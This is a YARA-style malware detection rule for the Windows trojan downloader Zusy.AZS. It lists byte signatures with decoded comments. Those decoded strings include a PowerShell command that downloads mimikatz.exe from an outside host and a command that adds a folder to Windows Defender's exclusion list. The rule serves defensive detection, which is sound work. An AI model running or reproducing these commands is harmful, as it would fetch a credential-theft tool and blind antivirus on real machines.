
rule TrojanDownloader_Win32_Zusy_AZS_MTB{
	meta:
		description = "TrojanDownloader:Win32/Zusy.AZS!MTB,SIGNATURE_TYPE_PEHSTR_EXT,0f 00 0f 00 05 00 00 "
		
	strings :
		$a_01_0 = {51 8d 4d 88 83 fa 08 51 6a 00 6a 00 68 00 02 00 00 6a 00 6a 00 8d 45 d4 0f 43 45 d4 6a 00 50 6a 00 } //1
		$a_01_1 = {63 6d 64 20 2f 63 20 70 6f 77 65 72 73 68 65 6c 6c 20 49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69 20 68 74 74 70 73 3a 2f 2f 78 73 70 61 63 65 74 2e 77 69 6b 69 2f 73 74 65 69 6e 2f 6d 69 6d 69 6b 61 74 7a 2e 65 78 65 20 2d 4f 75 74 66 69 6c 65 20 43 3a 5c 57 69 6e 58 52 41 52 5c 6d 69 6d 69 6b 61 74 7a 2e 65 78 65 } //5 cmd /c powershell Invoke-WebRequest -Uri https://xspacet.wiki/stein/mimikatz.exe -Outfile C:\WinXRAR\mimikatz.exe
		$a_01_2 = {63 6d 64 20 2f 63 20 70 6f 77 65 72 73 68 65 6c 6c 20 2d 69 6e 70 75 74 66 6f 72 6d 61 74 20 6e 6f 6e 65 20 2d 6f 75 74 70 75 74 66 6f 72 6d 61 74 20 6e 6f 6e 65 20 2d 4e 6f 6e 49 6e 74 65 72 61 63 74 69 76 65 20 2d 43 6f 6d 6d 61 6e 64 20 41 64 64 2d 4d 70 50 72 65 66 65 72 65 6e 63 65 20 2d 45 78 63 6c 75 73 69 6f 6e 50 61 74 68 20 22 43 3a 5c 57 69 6e 58 52 41 52 } //4 cmd /c powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\WinXRAR
		$a_01_3 = {50 72 6f 63 65 73 73 20 6c 61 75 6e 63 68 65 64 20 73 75 63 63 65 73 73 66 75 6c 6c 79 } //3 Process launched successfully
		$a_01_4 = {6c 64 65 72 64 5c 52 65 6c 65 61 73 65 5c 6c 64 65 72 64 2e 70 64 62 } //2 lderd\Release\lderd.pdb
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*5+(#a_01_2  & 1)*4+(#a_01_3  & 1)*3+(#a_01_4  & 1)*2) >=15
 
}